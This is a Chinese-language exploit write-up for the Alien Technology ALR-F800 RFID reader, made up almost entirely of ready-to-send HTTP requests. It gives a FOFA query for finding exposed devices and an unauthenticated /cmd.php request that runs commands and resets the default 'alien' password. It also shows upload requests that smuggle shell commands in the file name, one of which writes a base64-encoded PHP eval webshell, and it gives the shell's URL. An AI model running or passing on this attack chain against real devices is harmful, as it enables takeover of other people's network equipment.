# ALR-F800存在命令执行漏洞

该漏洞存在于 /var/www/cmd.php 中，未经授权的攻击者可以执行任意 CLI 命令，包括修改网络配置和登录凭据。

## fofa

```java
"ALR-F800"
```

## poc

```java
POST /cmd.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

cmd=help
```

重置密码

```java
POST /cmd.php HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

cmd=password=password
```

Web 界面和 SSH 的默认帐户（用户名 Alien）的密码将重置为密码 password

## 写文件

通过上面修改了web页面密码，进行修改Authorization认证，再通过下面请求包进行getshell

```java
POST /cgi-bin/upgrade.cgi HTTP/1.1
Host: VULNERABLE_SERVER_IP
Authorization: Basic YWxpZW46cGFzc3dvcmQ=
Content-Length: 301
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ3keNKAe5AQ9G7bs

------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
Content-Disposition: form-data; name="uploadedFile"; filename=";echo ZWNobyAiPD9waHAgZXZhbChcJF9SRVFVRVNUWydjbWQnXSk7Pz4iID4gL3Zhci93d3cvc2hlbGwucGhw| base64 -d | sh"
Content-Type: application/octet-stream

Hi！
------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
```

WebShell将被写入：

```
https://VULNERABLE_SERVER_IP//shell.php?cmd=phpinfo();
```



## 命令执行

```java
POST /admin/system.html HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Length: 412
Cache-Control: max-age=0
Authorization: Digest username="alien", realm="Authorized users only", nonce="e01f9b86814aced6260f94fdfc978b21", uri="/admin/system.html", response="cbc415aecfcceb4a4afa23973960b8da", qop=auth, nc=000000cc, cnonce="dd03b48ea65cac94" #REPLACE THIS
Connection: keep-alive

------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="upload_max_filesize"

3M
------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="uploadedFile"; filename=";whoami"
Content-Type: application/octet-stream

123
------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="action"

Install
------WebKitFormBoundaryJpks6wYXiOago8MS--
```



## 漏洞来源

- https://github.com/Push3AX/vul/blob/main/Alien%20Technology%20/ALR-F800.md